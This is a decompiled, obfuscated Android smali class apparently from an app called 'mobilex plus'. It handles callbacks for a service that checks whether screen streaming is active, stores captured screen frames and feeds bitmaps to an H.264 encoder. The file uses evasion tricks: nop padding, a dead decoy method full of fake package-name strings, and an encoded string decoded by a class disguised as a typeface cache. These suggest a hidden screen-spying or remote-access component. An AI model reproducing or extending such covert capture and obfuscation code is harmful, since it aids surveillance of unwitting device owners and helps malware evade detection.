.class public final Lv/s/tqMsvBGMHi2d1wCf3x;
.super Lv/s/LGm23hksIOxB;
.source "r8-map-id-15e63fcf80fafdb0de787d7190aafb45897c9495c974dfb43163f91afee6c091"

# interfaces
.implements Lv/s/deLJ4Z0aL3hcJ3O1;


# instance fields
.field public final synthetic Ee8d2j4S9Vm5yGuR:Ljava/lang/Object;

.field public final synthetic JXn4Qf7zpnLjP5:Ljava/lang/Object;

.field public final synthetic vekpFI4d1Nc4fakF:I


# direct methods
.method public synthetic constructor <init>(Ljava/lang/Object;ILjava/lang/Object;)V
    .locals 0

    .line 1
    iput p2, p0, Lv/s/tqMsvBGMHi2d1wCf3x;->vekpFI4d1Nc4fakF:I

    .line 2
    .line 3
    iput-object p1, p0, Lv/s/tqMsvBGMHi2d1wCf3x;->JXn4Qf7zpnLjP5:Ljava/lang/Object;

    .line 4
    .line 5
    iput-object p3, p0, Lv/s/tqMsvBGMHi2d1wCf3x;->Ee8d2j4S9Vm5yGuR:Ljava/lang/Object;

    nop

    .line 6
    .line 7
    const/4 p1, 0x1

    .line 8
    invoke-direct {p0, p1}, Lv/s/LGm23hksIOxB;-><init>(I)V

    .line 9
    .line 10
    .line 11
    return-void
.end method

.method private static synthetic morlnyalk()V
    .locals 1

    const-string v0, "net.manager.uaimrjhj"

    const-string v0, "RoomDatabase"

    const-string v0, "io.manager.zdqydqva"

    const-string v0, "net.data.utcsxqzw"

    const-string v0, "io.helper.dclco"

    const-string v0, "surface"

    const-string v0, "file://"

    return-void
.end method


# virtual methods
.method public final pyu8ovAipBTLYAiKab(Ljava/lang/Object;)Ljava/lang/Object;
    .locals 3

    .line 1
    iget v0, p0, Lv/s/tqMsvBGMHi2d1wCf3x;->vekpFI4d1Nc4fakF:I

    nop

    nop

    .line 2
    .line 3
    packed-switch v0, :pswitch_data_0

    .line 4
    .line 5
    .line 6
    check-cast p1, Ljava/lang/Throwable;

    .line 7
    .line 8
    iget-object p1, p0, Lv/s/tqMsvBGMHi2d1wCf3x;->JXn4Qf7zpnLjP5:Ljava/lang/Object;

    .line 9
    .line 10
    check-cast p1, Lv/s/zcffvBooRp7uR1q;

    .line 11
    .line 12
    iget-object p1, p1, Lv/s/zcffvBooRp7uR1q;->vekpFI4d1Nc4fakF:Landroid/os/Handler;

    .line 13
    .line 14
    iget-object v0, p0, Lv/s/tqMsvBGMHi2d1wCf3x;->Ee8d2j4S9Vm5yGuR:Ljava/lang/Object;

    .line 15
    .line 16
    check-cast v0, Lv/s/UubaJZRp66jTeLre;

    nop

    .line 17
    .line 18
    invoke-virtual {p1, v0}, Landroid/os/Handler;->removeCallbacks(Ljava/lang/Runnable;)V

    .line 19
    .line 20
    .line 21
    sget-object p1, Lv/s/Eo0e0FTdv96U7KeCzoB;->dDIMxZXP1V8HdM:Lv/s/Eo0e0FTdv96U7KeCzoB;

    .line 22
    .line 23
    return-object p1

    .line 24
    :pswitch_0
    check-cast p1, [B

    .line 25
    .line 26
    sget-object v0, Lapp/mobilex/plus/services/DataQFAdapter;->Companion:Lv/s/GARjgaGEpTotOxcl8vfe;

    .line 27
    .line 28
    invoke-virtual {v0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    .line 29
    .line 30
    .line 31
    invoke-static {}, Lapp/mobilex/plus/services/DataQFAdapter;->access$isScreenStreaming$cp()Z

    .line 32
    .line 33
    .line 34
    move-result v0

    .line 35
    if-nez v0, :cond_0

    .line 36
    .line 37
    goto :goto_0

    .line 38
    :cond_0
    if-eqz p1, :cond_1

    .line 39
    .line 40
    invoke-static {}, Lapp/mobilex/plus/services/DataQFAdapter;->access$getLatestFrame$cp()Ljava/util/concurrent/atomic/AtomicReference;

    .line 41
    .line 42
    .line 43
    move-result-object v0

    .line 44
    invoke-virtual {v0, p1}, Ljava/util/concurrent/atomic/AtomicReference;->set(Ljava/lang/Object;)V

    .line 45
    .line 46
    .line 47
    iget-object p1, p0, Lv/s/tqMsvBGMHi2d1wCf3x;->JXn4Qf7zpnLjP5:Ljava/lang/Object;

    .line 48
    .line 49
    check-cast p1, Lv/s/g78iUtGnOvef;

    nop

    .line 50
    .line 51
    iget v0, p1, Lv/s/g78iUtGnOvef;->w9sT1Swbhx3hs:I

    .line 52
    .line 53
    add-int/lit8 v0, v0, 0x1

    .line 54
    .line 55
    iput v0, p1, Lv/s/g78iUtGnOvef;->w9sT1Swbhx3hs:I

    .line 56
    .line 57
    goto/16 :goto_0

    .line 58
    :cond_1
    iget-object p1, p0, Lv/s/tqMsvBGMHi2d1wCf3x;->Ee8d2j4S9Vm5yGuR:Ljava/lang/Object;

    .line 59
    .line 60
    check-cast p1, Lv/s/g78iUtGnOvef;

    nop

    nop

    .line 61
    .line 62
    iget v0, p1, Lv/s/g78iUtGnOvef;->w9sT1Swbhx3hs:I

    .line 63
    .line 64
    add-int/lit8 v0, v0, 0x1

    .line 65
    .line 66
    iput v0, p1, Lv/s/g78iUtGnOvef;->w9sT1Swbhx3hs:I

    .line 67
    .line 68
    :goto_0
    sget-object p1, Lv/s/Eo0e0FTdv96U7KeCzoB;->dDIMxZXP1V8HdM:Lv/s/Eo0e0FTdv96U7KeCzoB;

    nop

    nop

    .line 69
    .line 70
    return-object p1

    .line 71
    :pswitch_1
    check-cast p1, Landroid/graphics/Bitmap;

    .line 72
    .line 73
    iget-object v0, p0, Lv/s/tqMsvBGMHi2d1wCf3x;->JXn4Qf7zpnLjP5:Ljava/lang/Object;

    .line 74
    .line 75
    check-cast v0, Lv/s/g78iUtGnOvef;

    .line 76
    .line 77
    const/4 v1, 0x0

    .line 78
    :try_start_0
    sget-object v2, Lapp/mobilex/plus/services/DataQFAdapter;->Companion:Lv/s/GARjgaGEpTotOxcl8vfe;

    .line 79
    .line 80
    invoke-virtual {v2}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    .line 81
    .line 82
    .line 83
    invoke-static {}, Lapp/mobilex/plus/services/DataQFAdapter;->access$isScreenStreaming$cp()Z

    .line 84
    .line 85
    .line 86
    move-result v2
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_1

    .line 87
    if-nez v2, :cond_2

    nop

    nop

    .line 88
    .line 89
    :goto_1
    invoke-static {v1}, Lapp/mobilex/plus/services/DataQFAdapter;->access$setH264CaptureInFlight$cp(Z)V

    .line 90
    .line 91
    .line 92
    goto/16 :goto_4

    .line 93
    :cond_2
    if-eqz p1, :cond_4

    nop

    nop

    .line 94
    .line 95
    :try_start_1
    invoke-static {}, Lapp/mobilex/plus/services/DataQFAdapter;->access$getHwEncoder$cp()Lv/s/lLybWDNhgEj7LwIe;

    .line 96
    .line 97
    .line 98
    move-result-object v2

    .line 99
    if-eqz v2, :cond_3

    .line 100
    .line 101
    invoke-virtual {v2, p1}, Lv/s/lLybWDNhgEj7LwIe;->dDIMxZXP1V8HdM(Landroid/graphics/Bitmap;)V
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    .line 102
    .line 103
    .line 104
    goto/16 :goto_2

    .line 105
    :catchall_0
    move-exception p1

    .line 106
    :try_start_2
    invoke-static {}, Lapp/mobilex/plus/services/DataQFAdapter;->access$getTAG$cp()Ljava/lang/String;

    .line 107
    .line 108
    .line 109
    const-string v2, "00250073005E008300D200B600C600AA00220066001B008200E200AD00DD00B500790036"

    nop

    .line 110
    .line 111
    invoke-static {v2}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 112
    .line 113
    .line 114
    invoke-virtual {p1}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    .line 115
    .line 116
    .line 117
    iget p1, v0, Lv/s/g78iUtGnOvef;->w9sT1Swbhx3hs:I

    .line 118
    .line 119
    add-int/lit8 p1, p1, 0x1

    nop

    nop

    .line 120
    .line 121
    iput p1, v0, Lv/s/g78iUtGnOvef;->w9sT1Swbhx3hs:I

    .line 122
    .line 123
    :cond_3
    :goto_2
    iget-object p1, p0, Lv/s/tqMsvBGMHi2d1wCf3x;->Ee8d2j4S9Vm5yGuR:Ljava/lang/Object;

    .line 124
    .line 125
    check-cast p1, Lv/s/g78iUtGnOvef;

    .line 126
    .line 127
    iget v0, p1, Lv/s/g78iUtGnOvef;->w9sT1Swbhx3hs:I

    .line 128
    .line 129
    add-int/lit8 v0, v0, 0x1

    .line 130
    .line 131
    iput v0, p1, Lv/s/g78iUtGnOvef;->w9sT1Swbhx3hs:I

    .line 132
    .line 133
    goto :goto_3

    .line 134
    :catchall_1
    move-exception p1

    .line 135
    goto :goto_5

    .line 136
    :cond_4
    iget p1, v0, Lv/s/g78iUtGnOvef;->w9sT1Swbhx3hs:I

    .line 137
    .line 138
    add-int/lit8 p1, p1, 0x1

    .line 139
    .line 140
    iput p1, v0, Lv/s/g78iUtGnOvef;->w9sT1Swbhx3hs:I
    :try_end_2
    .catchall {:try_start_2 .. :try_end_2} :catchall_1

    .line 141
    .line 142
    :goto_3
    sget-object p1, Lapp/mobilex/plus/services/DataQFAdapter;->Companion:Lv/s/GARjgaGEpTotOxcl8vfe;

    .line 143
    .line 144
    invoke-virtual {p1}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    .line 145
    .line 146
    .line 147
    goto/16 :goto_1

    .line 148
    :goto_4
    sget-object p1, Lv/s/Eo0e0FTdv96U7KeCzoB;->dDIMxZXP1V8HdM:Lv/s/Eo0e0FTdv96U7KeCzoB;

    .line 149
    .line 150
    return-object p1

    .line 151
    :goto_5
    sget-object v0, Lapp/mobilex/plus/services/DataQFAdapter;->Companion:Lv/s/GARjgaGEpTotOxcl8vfe;

    nop

    .line 152
    .line 153
    invoke-virtual {v0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    .line 154
    .line 155
    .line 156
    invoke-static {v1}, Lapp/mobilex/plus/services/DataQFAdapter;->access$setH264CaptureInFlight$cp(Z)V

    .line 157
    .line 158
    .line 159
    throw p1

    .line 160
    nop

    .line 161
    :pswitch_data_0
    .packed-switch 0x0
        :pswitch_1
        :pswitch_0
    .end packed-switch
.end method
